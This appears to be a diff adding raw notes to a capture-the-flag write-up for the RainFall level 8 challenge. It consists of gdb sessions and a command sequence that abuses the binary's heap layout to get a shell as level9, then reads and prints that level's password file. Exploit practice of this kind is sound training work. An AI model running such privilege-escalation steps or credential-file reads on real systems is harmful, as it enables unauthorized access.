@@ -315,3 +315,182 @@ undefined4 main(void)
   } while( true );
 }
 
+
+
+level8@RainFall:~$ ./level8
+(nil), (nil) 
+test 
+(nil), (nil) 
+
+(nil), (nil) 
+service
+(nil), 0x804a008 
+service
+(nil), 0x804a018 
+service
+(nil), 0x804a028 
+login
+Segmentation fault (core dumped)
+
+
+(gdb) b *0x080486dc
+Breakpoint 1 at 0x80486dc
+(gdb) b fwrite
+Breakpoint 2 at 0x8048450
+(gdb) b system
+Breakpoint 3 at 0x8048480
+(gdb) r
+Starting program: /home/user/level8/level8 
+(nil), (nil) 
+login
+
+Breakpoint 1, 0x080486dc in main ()
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x080486e7 in main ()
+(gdb) disas main
+[...]
+=> 0x080486e7 <+387>:	mov    0x20(%eax),%eax
+[...]
+(gdb) c
+Continuing.
+
+Program terminated with signal SIGSEGV, Segmentation fault.
+The program no longer exists.
+(gdb) r
+Starting program: /home/user/level8/level8 
+(nil), (nil) 
+service
+
+Breakpoint 1, 0x080486dc in main ()
+(gdb) c
+Continuing.
+(nil), 0x804a008 
+login  
+
+Breakpoint 1, 0x080486dc in main ()
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x080486e7 in main ()
+(gdb) 
+Continuing.
+
+Program terminated with signal SIGSEGV, Segmentation fault.
+The program no longer exists.
+
+
+(gdb) p *0x8048819
+$5 = 1752462689
+(gdb) p /t *0x8048819
+$6 = 1101000011101000111010101100001
+(gdb) p /c *0x8048819
+$15 = 97 'a'
+(gdb) p /x *0x8048819
+$16 = 0x68747561
+(gdb) p /f *0x8048819
+$17 = 4.61769072e+24
+(gdb) p /o *0x8048819
+$18 = 015035072541
+(gdb) b *0x080485c6
+Breakpoint 5 at 0x80485c6
+(gdb) c
+Continuing.
+(nil), (nil) 
+t
+
+Breakpoint 5, 0x080485c6 in main ()
+(gdb) p $eax
+$25 = 134514713
+(gdb) p $eax
+$25 = 134514713
+(gdb) p /t $eax
+$26 = 1000000001001000100000011001
+(gdb) p /t 0x8048819
+$27 = 1000000001001000100000011001
+(gdb) p 0x8048819
+$28 = 134514713
+(gdb) p /x 0x8048819
+$29 = 0x8048819
+(gdb) p /t 0x8048819
+$30 = 1000000001001000100000011001
+(gdb) p /f 0x8048819
+$31 = 3.98822871e-34
+(gdb) p /o 0x8048819
+$32 = 01001104031
+
+
+
+(gdb) b *0x080485bf
+Breakpoint 1 at 0x80485bf
+(gdb) r
+Starting program: /home/user/level8/level8 
+(nil), (nil) 
+
+
+Breakpoint 1, 0x080485bf in main ()
+(gdb) set $eax=134514713
+(gdb) c
+Continuing.
+0x804a008, (nil) 
+login
+
+Breakpoint 1, 0x080485bf in main ()
+(gdb) c
+Continuing.
+Password:
+0x804a008, (nil) 
+
+
+Breakpoint 1, 0x080485bf in main ()
+(gdb) b *0x080486ea
+Breakpoint 2 at 0x80486ea
+(gdb) c
+Continuing.
+0x804a008, (nil) 
+
+login
+
+Breakpoint 1, 0x080485bf in main ()
+(gdb) c
+Continuing.
+
+Breakpoint 2, 0x080486ea in main ()
+(gdb) p $eax
+$1 = 0
+(gdb) set $eax=1
+(gdb) c
+Continuing.
+$ ls
+level8
+$ id
+uid=2008(level8) gid=2008(level8) groups=2008(level8),100(users)
+$ cat /home/user/level9/.pass	
+cat: /home/user/level9/.pass: Permission denied
+
+
+0x8048819
+\x19\x88\x04\x08
+
+0x68747561
+\x61\x75\x74\x68
+
+
+level8@RainFall:~$ ./level8 
+(nil), (nil) 
+auth 
+0x804a008, (nil) 
+service
+0x804a008, 0x804a018 
+service 
+0x804a008, 0x804a028 
+login 
+$ id
+uid=2008(level8) gid=2008(level8) euid=2009(level9) egid=100(users) groups=2009(level9),100(users),2008(level8)
+$ cat /home/user/level9/.pass
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+$ exit
+0x804a008, 0x804a028 
